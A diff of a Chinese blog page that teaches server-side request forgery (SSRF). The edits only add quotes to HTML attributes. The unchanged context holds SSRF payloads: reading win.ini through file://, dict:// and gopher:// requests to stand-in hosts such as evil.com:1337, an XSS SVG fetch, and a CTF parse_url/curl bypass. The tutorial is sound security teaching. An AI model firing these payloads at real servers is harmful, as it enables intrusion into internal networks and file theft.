@@ -492,11 +492,11 @@
 <a id="more"></a>
 
 <ul>
-<li>一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，<font color=red>所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人</font>）</li>
-<li>SSRF 形成的原因大都是由于<font color = green>服务端</font>提供了从其他服务器应用获取数据的功能，且没有对目标地址做<font color=green>过滤与限制</font>。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。</li>
+<li>一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，<font color="red">所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人</font>）</li>
+<li>SSRF 形成的原因大都是由于<font color="green">服务端</font>提供了从其他服务器应用获取数据的功能，且没有对目标地址做<font color="green">过滤与限制</font>。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。</li>
 </ul>
 <blockquote>
-<p>比如 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。<br>所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做<font color=red>中间人</font>，访问b网站，从而达到攻击b网站需求。</p>
+<p>比如 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。<br>所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做<font color="red">中间人</font>，访问b网站，从而达到攻击b网站需求。</p>
 </blockquote>
 <hr>
 <p>通过修改http头让a.com去访问b.com：</p>
@@ -513,7 +513,7 @@ HOST: a.com
 </ol>
 <p>……</p>
 <blockquote>
-<p>故此ssrf一般评级为<font color=red>中高危</font>漏洞</p>
+<p>故此ssrf一般评级为<font color="red">中高危</font>漏洞</p>
 </blockquote>
 <hr>
 <h2 id="漏洞寻找"><a href="#漏洞寻找" class="headerlink" title="漏洞寻找"></a>漏洞寻找</h2><ul>
@@ -522,7 +522,7 @@ HOST: a.com
 <p>输入A网站URL –&gt; 发送请求 –&gt; A服务器接受请求（没有过滤），并处理 –&gt;返回用户响应</p>
 <p>【那网站有个请求是<a href="http://www.baidu.com/xxx.php?image=URL】" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=URL】</a></p>
 <ul>
-<li>那么产生SSRF漏洞的环节在哪里呢？<font color=red>安全的网站应接收请求后，检测请求的合法性</font></li>
+<li>那么产生SSRF漏洞的环节在哪里呢？<font color="red">安全的网站应接收请求后，检测请求的合法性</font></li>
 </ul>
 <p>产生的原因：服务器端的验证并没有对其请求获取图片的参数（image=）做出严格的过滤以及限制，导致A网站可以从其他服务器的获取数据</p>
 <p>例如</p>
@@ -532,10 +532,10 @@ HOST: a.com
 <blockquote>
 <p>如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码</p>
 </blockquote>
-<p>简析: SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后<font color=blue>服务器以他的身份来访问其他服务器的资源。</font></p>
+<p>简析: SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后<font color="blue">服务器以他的身份来访问其他服务器的资源。</font></p>
 <hr>
-<h2 id="SSRF产生反射型XSS"><a href="#SSRF产生反射型XSS" class="headerlink" title="SSRF产生反射型XSS"></a><font color=green>SSRF产生反射型XSS</font></h2><p>简单的从外部网站获取一个恶意payload，并且响应类型是html格式，如：</p>
-<pre><code>http://localhost:4567/?url=http://brutelogic.com.br/poc.svg</code></pre><h2 id="利用协议进行信息探测"><a href="#利用协议进行信息探测" class="headerlink" title="利用协议进行信息探测"></a><font color=green>利用协议进行信息探测</font></h2><ul>
+<h2 id="SSRF产生反射型XSS"><a href="#SSRF产生反射型XSS" class="headerlink" title="SSRF产生反射型XSS"></a><font color="green">SSRF产生反射型XSS</font></h2><p>简单的从外部网站获取一个恶意payload，并且响应类型是html格式，如：</p>
+<pre><code>http://localhost:4567/?url=http://brutelogic.com.br/poc.svg</code></pre><h2 id="利用协议进行信息探测"><a href="#利用协议进行信息探测" class="headerlink" title="利用协议进行信息探测"></a><font color="green">利用协议进行信息探测</font></h2><ul>
 <li>当找到一个 SSRF 时，第一件事情就是测试对应可支持的 url scheme，如：</li>
 </ul>
 <ol>
@@ -551,7 +551,7 @@ HOST: a.com
 
 http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</code></pre><h3 id="dic"><a href="#dic" class="headerlink" title="dic://"></a>dic://</h3><p>当服务端禁止或者只允许白名单从外部网站请求资源，你可以通过 dic:// 模式来发送一个请求</p>
 <blockquote>
-<p>dict协议是一个<font color=green>字典服务器协议</font>，通常用于让客户端使用过程中能够访问更多的字典源</p>
+<p>dict协议是一个<font color="green">字典服务器协议</font>，通常用于让客户端使用过程中能够访问更多的字典源</p>
 </blockquote>
 <p>DICT URL scheme 通过 DICT 协议引入定义或者可用的单词列表:</p>
 <pre><code>http://example.com/ssrf.php?dict://ad.com:1337/</code></pre><h3 id="sftp"><a href="#sftp" class="headerlink" title="sftp://"></a>sftp://</h3><p>Sftp 是一个 SSH 文件传输协议或安全文件传输协议，和 SSH 打包在一起的单独协议，和 ssh 一样都是通过安全连接进行通信。</p>
@@ -560,7 +560,7 @@ http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</code></pre><h3 id="d
 <pre><code>http://example.com/ssrf.php?url=http://ad.com/gopher.php</code></pre><p>gopher.php (host it on ad.com):</p>
 <pre><code>&lt;?php
   header(&#39;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#39;);
-?&gt;</code></pre><p>PS: <font color=red>在php中要使用gopher协议需要curl的支持</font></p>
+?&gt;</code></pre><p>PS: <font color="red">在php中要使用gopher协议需要curl的支持</font></p>
 <hr>
 <p>这里我用一道ctf的题目来说，题目如下：</p>
 <pre><code>&lt;?php
@@ -624,11 +624,11 @@ else{
 //flag in flag.php
 //phpinfo in phpinfo.php
 
-?&gt; </code></pre><p><font color=red>check_inner_ip</font> 通过 <font color=red>url_parse</font> 检测是否为内网 ip 。</p>
-<p>如果满足不是内网 ip ，通过 <font color=red>curl </font>请求 url 返回结果。</p>
+?&gt; </code></pre><p><font color="red">check_inner_ip</font> 通过 <font color="red">url_parse</font> 检测是否为内网 ip 。</p>
+<p>如果满足不是内网 ip ，通过 <font color="red">curl </font>请求 url 返回结果。</p>
 <p>乍一看好像并没有利用点，跳转也做了处理，最终都要经过 check_inner_ip 函数检测。但是忽略了 php_url_parse 和 curl 同时处理 url 不同。</p>
 <p>当处理这个地址</p>
-<pre><code>http://foo@example.com:80@google.com/</code></pre><p><font color=red>curl</font> 和<font color=red> php_url_parse</font> 处理后最终的目标不一样</p>
+<pre><code>http://foo@example.com:80@google.com/</code></pre><p><font color="red">curl</font> 和<font color="red"> php_url_parse</font> 处理后最终的目标不一样</p>
 <hr>
 <p>分析一下代码逻辑，检测是否内网 ip 通过 parse_url，而最后请求是用 curl 完成的。当遇到上面的 url 格式时，parse_url 判断的是第二个 @ 后接的地址，curl 请求的是第一个。</p>
 <p>于是利用思路就有了，让 parse_url 处理外部网站，最后 curl 请求内网网址。</p>
@@ -1207,7 +1207,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">25.9k</span>&nbsp;字
+                class="white-color">27k</span>&nbsp;字
             
             
             
